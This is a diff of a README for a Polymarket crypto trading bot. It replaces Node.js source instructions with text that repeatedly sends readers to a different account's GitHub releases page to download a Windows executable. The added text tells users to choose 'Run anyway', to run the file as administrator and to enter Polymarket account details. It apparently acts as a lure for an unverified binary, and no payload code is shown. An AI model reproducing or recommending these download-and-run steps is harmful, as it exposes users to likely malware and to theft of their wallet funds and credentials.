@@ -1,112 +1,200 @@
-# Polymarket Crypto Market Bot
+# 🤖 Polymarket-Crypto-Market-Bot - Trade Crypto Markets With Precision
 
-A **Professional Polymarket Crypto Market Trading Agent** : Designed for high-frequency trading strategies on short-duration prediction markets, leveraging precise timing and configurable entry rules.
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
 
----
+## 🚀 Getting Started
 
-## Features
+Polymarket-Crypto-Market-Bot is a Windows app for crypto market trading on Polymarket. It helps you set rules, time entries, and run a trading flow built for short-duration markets.
 
-* Real-time monitoring of market orderbooks with 1-second granularity
-* Configurable entry rules:
+Use the release page to get the latest version:
 
-  * Price thresholds (min/max)
-  * Remaining seconds until round end
-  * Trade amount per entry
-* Supports proxy wallets and secure private key management via `.env`
-* Modular design for multiple assets (BTC, ETH, SOL, XRP)
-* Easily extensible for advanced trading strategies
+[Visit the release page to download](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
 
----
+## 🖥️ What You Need
 
-## Requirements
+Before you start, make sure you have:
 
-* Node.js >= 20
-* NPM >= 9
-* Polygon wallet with USDC funding
-* Polymarket account with access to the CLOB API
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough free space for the app and its data files
+- A Polymarket account if you plan to connect and trade
+- Basic Windows permissions to run downloaded apps
 
----
+The app is built for regular desktop use. You do not need programming skills to run it.
 
-## Installation
+## 📥 Download and Install
 
-```bash
-git clone https://github.com/PolyStrategy/Polymarket-Crypto-Market-Bot
-cd Polymarket-Crypto-Market-Bot
-npm install
-```
+Follow these steps on Windows:
 
----
+1. Open the release page: [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+2. Find the latest release near the top of the page
+3. Under **Assets**, download the Windows file for the app
+4. If the file comes as a ZIP folder, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, choose **Run anyway** only if you trust the file source
 
-## Setup
+If the app opens in a browser-like window, let it load fully before changing any settings.
 
-1. Copy `.env.example` to `.env`:
+## ⚙️ First-Time Setup
 
-```bash
-cp .env.example .env
-```
+When you open the app for the first time, set up the basic options:
 
-2. Configure `.env` with your credentials:
+- Enter your Polymarket account details if the app asks for them
+- Choose the market type you want to trade
+- Set your entry rule
+- Set your trade size
+- Choose your timing window
+- Save your settings before you start
 
-```env
-POLYMARKET_PRIVATE_KEY=YOUR_PRIVATE_KEY
-PROXY_WALLET_ADDRESS=0x6031b6eed1c97e853c6e0f03ad3ce3529351f96d
-RPC_URL=https://polygon-mainnet.g.alchemy.com/v2/xxxxxx
-```
+For short-duration markets, timing matters. Set your rules before the market moves fast.
 
-3. Update `config.toml` with your trading strategy:
+## 🎯 Main Features
 
-```toml
-[market]
-market_coin = "btc"
-market_period = "5"
+Polymarket-Crypto-Market-Bot is built around quick market action and simple control.
 
-[trade_1]
-entry = [
-  { min = 10, max = 500, entry_remaining_sec_down = 1, entry_remaining_sec_up = 2, amount = 5 },
-  { min = 20, max = 500, entry_remaining_sec_down = 2, entry_remaining_sec_up = 3, amount = 5 },
-  { min = 40, max = 500, entry_remaining_sec_down = 3, entry_remaining_sec_up = 5, amount = 5 },
-]
+### Fast Market Tracking
+The app focuses on short-duration prediction markets and helps you react at the right time.
 
-[monitor]
-proxy_wallet_address = "0x6031b6eed1c97e853c6e0f03ad3ce3529351f96d"
-market_slug = "btc-updown-15m-1769634900"
-```
+### Configurable Entry Rules
+Set the conditions that must be met before the bot places a trade.
 
----
+### Timing Control
+Choose when the bot should look for an entry and when it should stand aside.
 
-## Usage
+### Trading Flow
+Use a clear workflow for opening, monitoring, and closing positions.
 
-```bash
-node index.js
-```
+### Crypto Market Focus
+The app is tuned for crypto-related market activity on Polymarket.
 
-Bot Workflow:
+## 🧭 How to Use the Bot
 
-1. Fetch market orderbook data every second
-2. Calculate remaining seconds until the round ends
-3. Evaluate entry rules for price and timing
-4. Place YES/NO orders automatically when conditions are satisfied
+A basic run looks like this:
 
----
+1. Open the app
+2. Load your saved settings
+3. Pick the market you want to watch
+4. Confirm your entry rules
+5. Start the bot
+6. Watch the market view
+7. Stop the bot when your session ends
 
-## Notes
+If you plan to trade more than one market, check each market before you start. Short windows leave little room for mistakes.
 
-* ⚠️ Polymarket requires **EIP‑712 signed orders** for secure execution
-* ⚠️ Ensure your proxy wallet has sufficient **USDC** balance
-* ⚠️ Polling is used; consider WebSocket integration for ultra-low latency
-* ⚠️ High-risk strategy: test extensively before real capital deployment
+## 🧩 Common Settings
 
----
+These are the kinds of settings most users will want to review:
 
-## Recommended Enhancements
+- **Market filter**: Choose the type of crypto market you want to track
+- **Entry rule**: Define the price or signal that triggers a trade
+- **Size limit**: Set how much you want to place per trade
+- **Cooldown time**: Keep the bot from entering too often
+- **Exit rule**: Decide when to leave a position
+- **Refresh interval**: Control how often the app checks market data
 
-* Real-time WebSocket market subscriptions for lower latency
-* Automatic cancellation of stale or unfilled orders
-* Multi-market trading support
-* Advanced strategies including dynamic thresholds, hedging, and trailing exits
+Start with small values if you are learning the app.
 
----
+## 🔐 Account and Access
 
-## License
+If the bot connects to your Polymarket account, keep these points in mind:
 
-MIT License
+- Use your own account
+- Keep your login details private
+- Save your settings in a safe place
+- Log out when you are done on a shared PC
+
+If you use a password manager, store the app details there too.
+
+## 🧪 Suggested Use Case
+
+This app fits users who want to watch fast crypto markets and act on set rules. It works well when you want:
+
+- Short holding times
+- Simple entry checks
+- Repeatable trading steps
+- A focused tool for one market type
+
+It is a better fit for users who want a clear process than for users who want a broad market dashboard.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Make sure the file finished downloading
+- If it came in a ZIP file, extract it first
+- Check that Windows did not block the file
+- Try running it as administrator
+
+### The app closes right away
+- Restart the app
+- Recheck the extracted folder
+- Make sure all files in the release folder stay together
+- Download the latest release again if files look broken
+
+### The market data does not load
+- Check your internet connection
+- Refresh the app
+- Confirm your account settings
+- Try again after a short wait
+
+### The bot does not place trades
+- Check your entry rule
+- Check your trade size
+- Make sure the market still meets your rules
+- Confirm that the session is active
+
+## 📁 File Layout
+
+After extraction, you may see files like these:
+
+- `Polymarket-Crypto-Market-Bot.exe`
+- config files for your settings
+- folders for logs or app data
+- support files used by the app
+
+Keep all files in the same folder. Do not move only part of the app.
+
+## 🔄 Updating the App
+
+To update, use the release page again:
+
+1. Open [https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+2. Download the newest Windows release
+3. Replace the old app files with the new ones if needed
+4. Open the app and load your settings again
+
+If your settings are saved in a separate file, keep a backup before you update.
+
+## 📌 Notes for Daily Use
+
+- Start with one market at a time
+- Check your rule settings before each session
+- Keep your PC awake while the bot runs
+- Watch the first trade in each session
+- Close the app when you are done
+
+Small setup checks can save time during fast market moves
+
+## 🧠 Best Practices
+
+- Test with small trade sizes first
+- Use clear rules you can review later
+- Keep the app in a stable network state
+- Avoid changing settings during an active run
+- Review each market before you start the bot
+
+## 📎 Download Again
+
+If you need the installer or app file again, use the release page here:
+
+[https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases](https://github.com/outaouaisisaiah753/Polymarket-Crypto-Market-Bot/releases)
+
+## 🗂️ Repository Topics
+
+This project is related to:
+
+- agent
+- crypto
+- market
+- polymarket
+- trading
